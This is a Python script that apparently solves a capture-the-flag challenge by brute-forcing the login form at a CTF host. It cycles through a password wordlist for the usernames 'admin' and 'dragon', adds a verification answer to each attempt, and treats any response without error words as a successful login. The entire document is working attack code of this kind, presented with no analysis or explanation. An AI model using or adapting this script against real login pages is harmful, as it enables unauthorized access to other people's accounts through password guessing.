import requests

url = "https://issessionsctf-dragon-net.chals.io/login"

VERIFICATIONS = [
    ("1", "9"), ("2", "3"), ("3", "7"), ("4", "6"), ("5", "8"),
    ("6", "2"), ("7", "4"), ("8", "5"), ("9", "1"), ("10", "10")
]

with open("wordlist.txt") as f:
    passwords = f.read().splitlines()

usernames = ["admin", "dragon"]

for username in usernames:
    for i, password in enumerate(passwords):
        vn, answer = VERIFICATIONS[i % 10]
        
        data = {
            "username": username,
            "password": password,
            "answer": answer,
            "verification_no": vn,
            "answer_hidden": answer,
        }
        r = requests.post(url, data=data)
        
        if "invalid" not in r.text.lower() and "incorrect" not in r.text.lower() and "wrong" not in r.text.lower():
            print(f"[+] SUCCESS! user={username} pass={password}")
            print(r.text[:1000])
            break
        else:
            print(f"[-] {username}:{password}")